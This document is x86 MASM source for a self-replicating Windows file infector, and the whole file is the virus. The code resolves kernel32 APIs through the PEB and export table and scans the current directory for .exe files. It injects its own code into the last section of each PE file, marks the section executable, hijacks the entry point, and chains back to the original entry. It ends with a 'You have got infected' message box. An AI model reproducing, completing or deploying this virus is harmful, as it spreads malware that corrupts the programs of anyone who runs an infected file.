.386
.model flat,stdcall 
option casemap:none
.data
.code
start:
    call main
startdata:
    GENERIC_BOTH            equ 0C0000000h
    GENERIC_READ            equ 80000000h
    GENERIC_WRITE           equ 40000000h
    FILE_SHARE_READ         equ 1
    FILE_MAP_ALL_ACCESS     equ 0F001Fh
    NULL                    equ 0
    OPEN_EXISTING           equ 3
    CREATE_ALWAYS           equ 2
    FILE_BEGIN              equ 0
    FILE_CURRENT            equ 1
    FILE_END                equ 2
    FILE_ATTRIBUTE_NORMAL   equ 80h
    MEM_RESERVE             equ 2000h
    PAGE_READWRITE          equ 4
    MEM_COMMIT              equ 1000h
    MEM_RELEASE             equ 8000h
    INVALID_HANDLE_VALUE    equ -1
    MAXDWORD                equ 0FFFFFFFFh

    MAX_PATH                equ 260

    FILETIME STRUCT
        dwLowDateTime     DWORD     ?
        dwHighDateTime    DWORD     ?
    FILETIME ENDS

    WIN32_FIND_DATA STRUCT
        dwFileAttributes       DWORD ?
        ftCreationTime         FILETIME <>
        ftLastAccessTime       FILETIME <>
        ftLastWriteTime        FILETIME <>
        nFileSizeHigh          DWORD ?
        nFileSizeLow           DWORD ?
        dwReserved0            DWORD ?
        dwReserved1            DWORD ?
        cFileName              BYTE MAX_PATH dup (?)
        cAlternateFileName     BYTE 14 dup (?)
    WIN32_FIND_DATA ENDS

    retAddr         db 68h, 0, 0, 0, 0, 0C3h, 0
    vrsize          dd 0
    data            DWORD 0
    hFind           DWORD 0
    hFile           DWORD INVALID_HANDLE_VALUE
    hMap            DWORD INVALID_HANDLE_VALUE
    lpFileSize      DWORD 0
    lpBase          DWORD 0
    CurrentPath     db MAX_PATH dup(0)
    exeExtension    db MAX_PATH dup(0)
    exePath         db MAX_PATH dup(0)
    FileName        db MAX_PATH dup(0)
    ffd             WIN32_FIND_DATA <>
    
    ptrOEP              dd 0
    peOEP               dd 0
    peFileAlignment     dd 0
    peSectionAlignment  dd 0
    peImageBase         dd 0
    peNewsz             dd 0
    peNoSection         dw 0
    lastRawsz           dd 0
    lastRawaddr         dd 0
    lastVirsz           dd 0
    lastViraddr         dd 0
    rvaAddr         dd 0
    rvaName         dd 0
    rvaOrd          dd 0
    counter         dd 0

    strkernel32             db "KERNEL32.DLL", 0
    struser32               db "user32.dll", 0
    ptrGetProcAddress       dd 0
    strGetProcAddress       db "GetProcAddress", 0
    ptrlstrlen              dd 0
    strlstrlen              db "lstrlenA", 0
    ptrMessageBox           dd 0
    strMessageBox           db "MessageBoxA", 0
    strCaption              db "rekcusTQ", 0
    strText                 db "You have got infected", 0

funcKernel32Ptr:
    ptrCloseHandle          dd 0
    ptrCreateFile           dd 0
    ptrCreateFileMappingA   dd 0
    ptrExitProcess          dd 0
    ptrFindFirstFile        dd 0
    ptrFindNextFile         dd 0
    ptrGetCommandLine       dd 0
    ptrGetCurrentDirectory  dd 0
    ptrGetFileSize          dd 0
    ptrGetFullPathName      dd 0
    ptrLoadLibrary          dd 0
    ptrlstrcmp              dd 0
    ptrMapViewOfFile        dd 0
    ptrSetFilePointer       dd 0
    ptrVirtualAlloc         dd 0
    ptrWriteFile            dd 0
    lenKernel32Ptr          EQU $-funcKernel32Ptr

funcKernel32Str:
    strCloseHandle          db "CloseHandle", 0
    strCreateFile           db "CreateFileA", 0
    strCreateFileMappingA   db "CreateFileMappingA", 0
    strExitProcess          db "ExitProcess", 0
    strFindFirstFile        db "FindFirstFileA", 0
    strFindNextFile         db "FindNextFileA", 0
    strGetCommandLine       db "GetCommandLineA", 0
    strGetCurrentDirectory  db "GetCurrentDirectoryA", 0
    strGetFileSize          db "GetFileSize", 0
    strGetFullPathName      db "GetFullPathNameA", 0
    strLoadLibrary          db "LoadLibraryA", 0
    strlstrcmp              db "lstrcmpA", 0
    strMapViewOfFile        db "MapViewOfFile", 0
    strSetFilePointer       db "SetFilePointer", 0
    strVirtualAlloc         db "VirtualAlloc", 0
    strWriteFile            db "WriteFile", 0

alignSize PROTO :DWORD, :DWORD
alignSize PROC num:DWORD, val:DWORD
    push edx
    xor edx, edx
    mov eax, num
    mov ecx, val
    div ecx
    cmp edx, 0
    je szAlign
    inc eax
szAlign:
    mul ecx
    pop edx
    ret
alignSize endp

main:
    pop ebp
    sub ebp, offset startdata
    assume fs:NOTHING
    mov esi, fs:[30h]           ; PEB
    mov eax, [esi+0Ch]          ; PEB->Ldr
    mov esi, [eax+14h]          ; PEB->Ldr.InMemOrder
    mov edi, esi
    findKernel32:
        mov eax, [esi+28h]      ; dll name
        lea ebx, [ebp+offset strkernel32]
        xor ecx, ecx
        mov ecx, -1
    cmpKernel32:
        inc ecx
        xor edx, edx
        movzx dx, BYTE ptr [ebx+ecx]
        cmp dx, 0
        je findExportTable
        cmp WORD ptr [eax+ecx*2], dx
        je cmpKernel32
        je findExportTable
        mov esi, [esi]
        jmp findKernel32
    findExportTable:
        mov eax, esi
        mov ebx, [eax+10h]
        mov eax, [ebx+3Ch]
        add eax, ebx
        add eax, 78h                ; data directory
        mov ecx, [eax]
        add ecx, ebx                ; export directory
        add ecx, 1Ch
        mov eax, [ecx]              ; eax = rva address function
        add eax, ebx
        lea edx, [ebp+offset rvaAddr]
        mov [edx], eax
        add ecx, 4
        mov eax, [ecx]              ; esi = rva name
        add eax, ebx
        lea edx, [ebp+offset rvaName]
        mov [edx], eax
        add ecx, 4
        mov eax, [ecx]              ; edi = rva name ordinal
        add eax, ebx
        lea edx, [ebp+offset rvaOrd]
        mov [edx], eax
        mov [ebp+offset counter], -1
    findGetprocaddr:
        inc [ebp+counter]
        mov ecx, -1
        mov edx, [ebp+counter]
        shl edx, 2
        mov esi, [ebp+rvaName]
        add esi, edx
        mov esi, [esi]
        add esi, ebx
        lea edi, [ebp+strGetProcAddress]
        cntChr:
            inc ecx
            mov dl, BYTE ptr [edi+ecx]
            cmp dl, 0
            je getproc
            cmp [esi+ecx], dl
            je cntChr
        jmp findGetprocaddr
        getproc:
            mov eax, [ebp+counter]
            shl eax, 1
            mov ecx, [ebp+rvaOrd]
            add eax, ecx
            xor ecx, ecx
            mov cx, WORD ptr [eax]
            shl ecx, 2
            mov edx, [ebp+rvaAddr]
            add edx, ecx
            mov eax, [edx]
            add eax, ebx
            lea edx, [ebp+ptrGetProcAddress]
            mov [edx], eax
            mov ecx, eax
            lea eax, [ebp+strlstrlen]
            push eax
            push ebx
            call ecx
            lea edx, [ebp+ptrlstrlen]
            mov [edx], eax
            xor ecx, ecx
getApi:
    lea esi, [ebp+funcKernel32Ptr]
    lea edi, [ebp+funcKernel32Str]
    findNextApi:
        push ecx
        mov eax, [ebp+ptrGetProcAddress]
        push edi
        push ebx
        call eax
        mov [esi], eax
        mov eax, [ebp+ptrlstrlen]
        push edi
        call eax
        inc eax
        add edi, eax
        add esi, 4
        pop ecx
        add ecx, 4
        cmp ecx, lenKernel32Ptr
        jne findNextApi

        mov eax, [ebp+ptrLoadLibrary]
        lea ecx, [ebp+offset struser32]
        push ecx
        call eax
        mov edx, eax
        mov eax, [ebp+ptrGetProcAddress]
        lea ecx, [ebp+offset strMessageBox]
        push ecx
        push edx
        call eax
        lea edx, [ebp+ptrMessageBox]
        mov [edx], eax

infect:
    ; invoke GetCommandLine
    push ebx
    mov eax, [ebp+ptrGetCommandLine]
    call eax
    mov ecx, -1
    lea ebx, [ebp+offset FileName]
    fileName:
        inc ecx
        cmp BYTE ptr [eax+ecx], 34      ; '"' character
        je fileName
        cmp BYTE ptr [eax+ecx], 0
        je beginCode
        mov dl, BYTE ptr [eax+ecx]
        mov BYTE ptr [ebx+ecx-1], dl
        jmp fileName
    beginCode:
        ; invoke GetCurrentDirectory, MAX_PATH, addr CurrentPath
        mov eax, [ebp+ptrGetCurrentDirectory]
        lea ecx, [ebp+offset CurrentPath]
        push ecx
        push MAX_PATH
        call eax
        lea eax, [ebp+offset CurrentPath]
        lea edx, [ebp+offset exeExtension]
    makeExePath:
        cmp BYTE ptr [eax], 0
        je addExe
        mov cl, BYTE ptr [eax]
        mov BYTE ptr [edx], cl
        inc edx
        inc eax
        jmp makeExePath
    addExe:
        mov cl, 92                  ; \
        mov BYTE ptr [edx], cl
        mov cl, 42                  ; *
        mov BYTE ptr [edx+1], cl
        mov cl, 46                  ; .
        mov BYTE ptr [edx+2], cl
        mov cl, 101                 ; e
        mov BYTE ptr [edx+3], cl
        mov cl, 120                 ; x
        mov BYTE ptr [edx+4], cl
        mov cl, 101                 ; e
        mov BYTE ptr [edx+5], cl
        xor cl, cl                  ; 0
        mov BYTE ptr [edx+6], cl

    mov eax, [ebp+ptrFindFirstFile]
    lea ecx, [ebp+ffd]
    push ecx
    lea ecx, [ebp+exeExtension]
    push ecx
    call eax
    lea edx, [ebp+offset hFind]
    mov [edx], eax
    cmp eax, 0
    je exit
    jmp infectFunc
    
    exeSearch:
        ; invoke FindNextFile, hFind, addr ffd
        mov eax, [ebp+ptrFindNextFile]
        lea ecx, [ebp+ffd]
        push ecx
        mov ecx, [ebp+offset hFind]
        push ecx
        call eax
        cmp eax, 0
        je exit
        jmp infectFunc

    infectFunc:
            lea eax, [ebp+offset start]
            lea ecx, [ebp+offset endMain]
            sub ecx, eax
            mov [ebp+vrsize], ecx
        ; invoke lstrcmp, addr FileName, addr ffd.cFileName
        mov eax, [ebp+ptrlstrcmp]
        lea ecx, [ebp+offset ffd.cFileName]
        push ecx
        lea ecx, [ebp+offset FileName]
        push ecx
        call eax
        cmp eax, 0
        je exeSearch
        ; invoke GetFullPathName, addr ffd.cFileName, addr exePath
        mov eax, [ebp+ptrGetFullPathName]
        push 0
        lea ecx, [ebp+offset exePath]
        push ecx
        push MAX_PATH
        lea ecx, [ebp+offset ffd.cFileName]
        push ecx
        call eax
        ; invoke lstrcmp, addr exePath, addr FileName
        mov eax, [ebp+ptrlstrcmp]
        lea ecx, [ebp+offset FileName]
        push ecx
        lea ecx, [ebp+offset exePath]
        push ecx
        call eax
        cmp eax, 0
        je exeSearch
        ; invoke CreateFile, exePath, BOTH, 0, 0, OPEN_EXIST, FILE_ATTR_NORMAL, 0
        mov eax, [ebp+ptrCreateFile]
        push NULL
        push FILE_ATTRIBUTE_NORMAL
        push OPEN_EXISTING
        push NULL
        push FILE_SHARE_READ
        push GENERIC_BOTH
        lea ecx, [ebp+offset exePath]
        push ecx
        call eax
        cmp eax, INVALID_HANDLE_VALUE                   ; create file handle
        je exeSearch
        mov [ebp+hFile], eax

        ; invoke GetFileSize
        mov eax, [ebp+ptrGetFileSize]
        push NULL
        mov ecx, [ebp+hFile]
        push ecx
        call eax
        add eax, [ebp+vrsize]
        lea ecx, [ebp+offset lpFileSize]
        mov [ecx], eax
        
        ; invoke CreateFileMappingA, hFile, 0, PAGE_READWRITE, 0, 0, 0
        mov eax, [ebp+ptrCreateFileMappingA]
        push NULL
        mov ecx, [ebp+lpFileSize]
        add ecx, 6
        push ecx
        push NULL
        push PAGE_READWRITE
        push NULL
        mov ecx, [ebp+hFile]
        push ecx
        call eax
        or eax, eax                                     ; map file handle
        jz exeSearch
        mov [ebp+hMap], eax
        
        ; invoke MapViewOfFile, hMap, FILE_MAP_READ, 0, 0, 0
        mov eax, [ebp+ptrMapViewOfFile]
        mov ecx, [ebp+lpFileSize]
        push ecx
        push NULL
        push NULL
        push FILE_MAP_ALL_ACCESS
        mov ecx, [ebp+offset hMap]
        push ecx
        call eax
        or eax, eax                                     ; create map handle
        jz exeSearch
        mov [ebp+lpBase], eax

        checkPE:
            mov esi, [ebp+lpBase]
            cmp WORD ptr [esi], 5A4Dh                      ; check PE file magic = "MZ"
            jne freeMem

            mov eax, [esi+3Ch]
            add esi, eax                                    ; e_lfanew
            cmp DWORD ptr [esi], 4550h                      ; check PE signature = "PE"
            jne freeMem

        ; initialize pe header
            mov cx, WORD ptr [esi+6]                        ; NumberOfSections
            mov WORD ptr [ebp+peNoSection], cx
            mov ecx, 352C0878h
            cmp [esi+8], ecx
            je freeMem
            mov [esi+8], ecx
            add esi, 18h
            lea ecx, [esi+10h]
            mov [ebp+ptrOEP], ecx
            mov ecx, [ecx]
            mov [ebp+peOEP], ecx
            mov ecx, [esi+1Ch]
            mov [ebp+peImageBase], ecx
            mov ecx, [esi+20h]
            mov [ebp+peSectionAlignment], ecx
            mov ecx, [esi+24h]
            mov [ebp+peFileAlignment], ecx
            lea ecx, [esi+38h]
            mov [ebp+peNewsz], ecx

        sectionModify:
            mov edx, esi
            add edx, 0E0h
            mov eax, 28h
            xor ecx, ecx
            mov cx, WORD ptr [ebp+peNoSection]
            dec ecx
            mul ecx
            add edx, eax
            add edx, esi
            add edx, 0E0h
            push edx
            lea eax, [edx+24h]              ; characteristics
            mov ecx, 020000020h
            xor [eax], ecx
            mov ecx, [edx+14h]              ; raw address
            mov [ebp+lastRawaddr], ecx
            mov ecx, [edx+10h]              ; raw size
            mov [ebp+lastRawsz], ecx
            mov ecx, [edx+0Ch]              ; virtual address
            mov [ebp+lastViraddr], ecx
            mov ecx, [edx+8h]               ; virtual size
            mov [ebp+lastVirsz], ecx

            ; add ecx, [ebp+lastRawsz]
            ; mov eax, [ebp+peFileAlignment]
            ; invoke alignSize, ecx, eax
            mov eax, [ebp+lpFileSize]
            add eax, 6
            sub eax, [ebp+lastRawaddr]
            mov [edx+10h], eax              ; increase raw size

            mov ecx, [ebp+vrsize]
            add ecx, [ebp+lastVirsz]
            mov eax, [ebp+peSectionAlignment]
            invoke alignSize, ecx, eax
            mov [edx+8h], eax               ; round up virtual size

            add eax, [ebp+lastViraddr]
            mov ecx, [ebp+peNewsz]
            mov [ecx], eax                  ; save virtual addr

            mov ecx, [ebp+vrsize]

        ; write virus
            mov edi, [ebp+lpBase]
            add edi, [ebp+lastRawsz]
            add edi, [ebp+lastRawaddr]
            lea esi, [ebp+offset start]
            rep movsb
            mov ecx, [ebp+lastRawsz]
            add ecx, [ebp+lastViraddr]
            mov eax, [ebp+ptrOEP]
            mov [eax], ecx

            mov ecx, [ebp+lastRawaddr]
            add ecx, [ebp+lastRawsz]
            add ecx, [ebp+vrsize]
            add ecx, [ebp+lpBase]
            mov edi, ecx

        ; write return address            
            lea edx, [ebp+retAddr]
            inc edx
            mov ecx, [ebp+peOEP]
            add ecx, [ebp+peImageBase]
            mov [edx], ecx
            mov esi, edx
            dec esi
            mov ecx, 6
            rep movsb
            pop edx

            mov eax, [ebp+ptrWriteFile]
            push NULL
            lea ecx, [ebp+offset data]
            push ecx
            mov ecx, [ebp+lastRawaddr]
            add ecx, [edx+10h]
            push ecx
            mov ecx, [ebp+lpBase]
            push ecx
            mov ecx, [ebp+hFile]
            push ecx
            call eax

    freeMem:
        mov eax, [ebp+ptrCloseHandle]
        mov ecx, [ebp+hMap]
        push ecx
        call eax
        mov eax, [ebp+ptrCloseHandle]
        mov ecx, [ebp+hFile]
        push ecx
        call eax
        jmp exeSearch

exit:
    ; invoke MessageBox, 0, addr strText, addr strCaption, 0
    mov eax, [ebp+ptrMessageBox]
    push NULL
    lea ecx, [ebp+offset strCaption]
    push ecx
    lea ecx, [ebp+offset strText]
    push ecx
    push NULL
    call eax
    cmp ebp, 0
    jne endMain
    mov eax, [ebp+ptrExitProcess]
    push 0
    call eax

endMain:
end start
